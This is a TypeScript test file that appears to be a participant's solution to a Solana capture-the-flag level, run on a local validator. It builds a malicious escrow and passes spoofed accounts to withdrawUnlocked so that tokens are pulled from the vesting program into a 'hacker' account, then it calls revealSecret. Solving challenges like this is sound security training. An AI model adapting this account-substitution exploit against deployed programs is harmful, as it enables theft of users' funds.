import * as anchor from "@coral-xyz/anchor";
import * as web3 from "@solana/web3.js";
import * as spl from "@solana/spl-token";
import { Level4 } from "../target/types/level_4";
import * as path from 'path';
import * as fs from 'fs';
import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, createAssociatedTokenAccount, getAssociatedTokenAddressSync, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";


const USDC = new web3.PublicKey("DLnC1zbKwRX9BjcM9ZuV8uvXaqFY5JhhGWAuY7gVtwXD")
const ESCROW = new web3.PublicKey("Gi2wpf29MLsgMZWmUEtVndB2BKX5TLyEhdWt4bBWGVrP")
const ESCROW_TOKEN_ACCOUNT = new web3.PublicKey("2Me5B53SU2z5eC5ig8oyMuWosryVyMjsXRnvxx5cVwqv")
const HACKER_TOKEN_ACCOUNT = new web3.PublicKey("RzJdKwZLe2hB8KgsE87YwXJQKTHFnAGiV4hAuC94nGa")
const SENDER = new web3.PublicKey("J6oF4UUqWEW7YW3c4CNHWZybe2oMYSpHni8Su445fkt5")
const SENDER_TOKEN_ACCOUNT = new web3.PublicKey("2CoFvgSNNV7oZcujdPV7Pe79GUdBuLkTKZvuKDZASrp8")


// x x x x x x x x x x x x x x x x x x x x x
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE BELOW
// | | | | | | | | | | | | | | | | | | | | |
// v v v v v v v v v v v v v v v v v v v v v


const SECRET = ""


// ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^
// | | | | | | | | | | | | | | | | | | | | |
//           ADD SECRETS CODE ABOVE
// | | | | | | | | | | | | | | | | | | | | |
// x x x x x x x x x x x x x x x x x x x x x


describe("level-4", async () => {
  const provider = anchor.AnchorProvider.local("http://127.0.0.1:8899");
  anchor.setProvider(provider);

  const hacker = load_keypair('../accounts/hacker.json');
  const recipient =  web3.Keypair.generate();
  const program = anchor.workspace.Level4 as anchor.Program<Level4>;
  const attackEscrow = web3.Keypair.generate();

  let ESCROW_PDA: any;
  let ATTACK_ESCROW_ATA: any;
  let HACKER_TA: any;


  before("Setup", async () => {
    await airdrop(provider.connection, hacker.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, attackEscrow.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);
    await airdrop(provider.connection, recipient.publicKey, 10 * anchor.web3.LAMPORTS_PER_SOL);

    const hackerTokenAccountInfo = await provider.connection.getAccountInfo(HACKER_TOKEN_ACCOUNT);
    const senderTokenAccountInfo = await provider.connection.getAccountInfo(SENDER_TOKEN_ACCOUNT);
    const escrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
    console.log("Hacker Token Account owner:", hackerTokenAccountInfo?.owner.toBase58());
    console.log("Hacker public key:", hacker.publicKey.toBase58());
    console.log("Sender token account owner:", senderTokenAccountInfo?.owner.toBase58())
    console.log("Escrow token account owner:", escrowTokenAccountInfo?.owner.toBase58())

    const hackerTokenAccount = await spl.getOrCreateAssociatedTokenAccount(
        provider.connection,
        hacker,
        USDC,
        hacker.publicKey,
        false,
        'confirmed',
        { commitment: 'confirmed' },
        TOKEN_2022_PROGRAM_ID,
        ASSOCIATED_TOKEN_PROGRAM_ID
      );
    console.log("Created new hacker token account:", hackerTokenAccount.address.toBase58());
    await new Promise(resolve => setTimeout(resolve, 2000));
    HACKER_TA = hackerTokenAccount.address;
    console.log("HACKER_TA:", HACKER_TA.toBase58());


    
    [ESCROW_PDA] = await web3.PublicKey.findProgramAddressSync(
      [Buffer.from("ESCROW_PDA_AUTHORITY")],
      program.programId
    );
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(`Escrow PDA -> ${ESCROW_PDA}`)
    const escrowPdaInfo = await provider.connection.getAccountInfo(ESCROW_PDA);
    console.log("Escrow PDA owner:", escrowPdaInfo?.owner.toBase58());

    const attackEscrowAta =  await spl.getAssociatedTokenAddress(
      USDC,
      attackEscrow.publicKey,
      false,
      spl.TOKEN_2022_PROGRAM_ID,
      spl.ASSOCIATED_TOKEN_PROGRAM_ID
    );

    const tx = new anchor.web3.Transaction().add(
      spl.createAssociatedTokenAccountInstruction(
        hacker.publicKey, // payer
        attackEscrowAta, // ata
        ESCROW_PDA, // authority
        USDC, // mint
        spl.TOKEN_2022_PROGRAM_ID,
        spl.ASSOCIATED_TOKEN_PROGRAM_ID
      )
    );

    await anchor.web3.sendAndConfirmTransaction(provider.connection, tx, [hacker]);

    // Verify the ATA was created
    const attackEscrowAtaPubKey =  new web3.PublicKey(attackEscrowAta)
    console.log(`Attack Escrow ATA PubKey -> ${attackEscrowAtaPubKey}`)
    const attackEscrowTokenAccountInfo = await provider.connection.getAccountInfo(ESCROW_TOKEN_ACCOUNT);
    console.log(`Attack Escrow ATA Owner -> ${attackEscrowTokenAccountInfo?.owner.toBase58()}`)
    ATTACK_ESCROW_ATA = attackEscrowAtaPubKey

  });


  // x x x x x x x x x x x x x x x x x x x x x
  // | | | | | | | | | | | | | | | | | | | | |
  //           ADD YOUR CODE BELOW
  // | | | | | | | | | | | | | | | | | | | | |
  // v v v v v v v v v v v v v v v v v v v v v

  it("Initialize Malicious Escrow", async () => {


    const hack = await program.methods.initVesting(
      recipient.publicKey, //recipient
      new anchor.BN('1000'), //amount
      new anchor.BN('0'), //start_at
      new anchor.BN('2'), //end_at
      new anchor.BN('1') //interval
    )
    .accounts({
      sender: hacker.publicKey,
      senderTokenAccount: HACKER_TA,
      escrow: attackEscrow.publicKey,
      escrowTokenAccount: ATTACK_ESCROW_ATA,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId,
    })
    .signers([hacker])
    .rpc();
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(hack)

  });

  it("Inspect escrow", async () => {  
    const escrow = await program.account.escrow.fetch(ESCROW);
    console.log(escrow);
  });

  it ("Withdraw", async () => {
    const withdraw = await program.methods.withdrawUnlocked()
    .accounts({
      recipient: hacker.publicKey,
      recipientTokenAccount: HACKER_TA,
      escrow: attackEscrow.publicKey,
      escrowTokenAccount: ATTACK_ESCROW_ATA,
      escrowPdaAuthority: ESCROW,
      mint: USDC,
      tokenProgram: TOKEN_2022_PROGRAM_ID,
      systemProgram: web3.SystemProgram.programId
    })
    .signers([hacker])
    .rpc()
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log(withdraw);

  })


  it("Reveals secrets", async () => {

    const airdropSignature = await provider.connection.requestAirdrop(
      hacker.publicKey,
      1000000000 // 1 SOL
    );
    await provider.connection.confirmTransaction(airdropSignature);
    // Create the transaction
    const tx = await program.methods.revealSecret(SECRET)
      .accounts({
        hacker: hacker.publicKey,
        hackerTokenAccount: HACKER_TOKEN_ACCOUNT,
        mint: USDC
      })
      .transaction();
  
    // Sign the transaction
    tx.feePayer = hacker.publicKey;
    tx.recentBlockhash = (await provider.connection.getLatestBlockhash()).blockhash;
    tx.sign(hacker);
  
    // Send the transaction
    const txid = await provider.connection.sendRawTransaction(tx.serialize());
    
    // Wait for confirmation
    const confirmation = await provider.connection.confirmTransaction(txid);
    
    console.log("Transaction confirmed. Signature:", txid);
  
    // Optional: Fetch the transaction details
    const txDetails = await provider.connection.getTransaction(txid, {
      commitment: 'confirmed',
      maxSupportedTransactionVersion: 0
    });
  
    console.log("Transaction details:", txDetails);
  
    // Wait for 2 seconds (if still needed)
    await new Promise(resolve => setTimeout(resolve, 1000));
  });
  




});

async function airdrop(connection: any, address: any, amount = 1000000000) {
  await connection.confirmTransaction(await connection.requestAirdrop(address, amount), "confirmed");
}

function load_keypair(name: string)
  : anchor.web3.Keypair {
  const jsonFilePath = path.join(__dirname, name);
  let rawdata = fs.readFileSync(jsonFilePath);
  let keyData = JSON.parse(rawdata.toString());
  return anchor.web3.Keypair.fromSecretKey(new Uint8Array(keyData))

}
